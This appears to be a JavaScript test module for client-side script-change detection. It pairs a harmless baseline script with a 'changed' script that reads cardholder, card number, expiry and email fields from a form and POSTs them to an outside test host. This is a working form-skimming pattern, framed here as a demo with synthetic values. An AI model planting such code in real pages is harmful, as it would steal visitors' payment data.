export const baselineScript = `(() => {
  const status = document.querySelector('#signal-status');
  if (status) status.textContent = 'Baseline script loaded; no mock fields were read.';
})();`;

export const changedScript = `(() => {
  const fields = {
    cardholder: document.querySelector('[name="cardholder"]')?.value ?? 'Demo Visitor',
    cardNumber: document.querySelector('[name="cardnumber"]')?.value ?? '0000 0000 0000 0000',
    expiry: document.querySelector('[name="expiry"]')?.value ?? '12 / 30',
    email: document.querySelector('[name="email"]')?.value ?? 'demo@example.invalid',
  };
  const status = document.querySelector('#signal-status');
  fetch('https://cf-testing.com/cdn-cgi/trace?event=client-side-security-change-test', {
    method: 'POST', mode: 'no-cors', credentials: 'omit',
    headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
    body: JSON.stringify({ demo: 'client-side-security-code-change', ...fields }),
    keepalive: true,
  }).then(() => {
    if (status) status.textContent = 'Changed script loaded; synthetic fields sent to cf-testing.com.';
  }).catch(() => {
    if (status) status.textContent = 'Changed script loaded; the test connection could not be sent.';
  });
})();`;

export const RUN_ID_PATTERN = /^[a-f0-9]{32}$/;
export const CONTROL_TOKEN_PATTERN = /^[a-f0-9-]{36}$/;
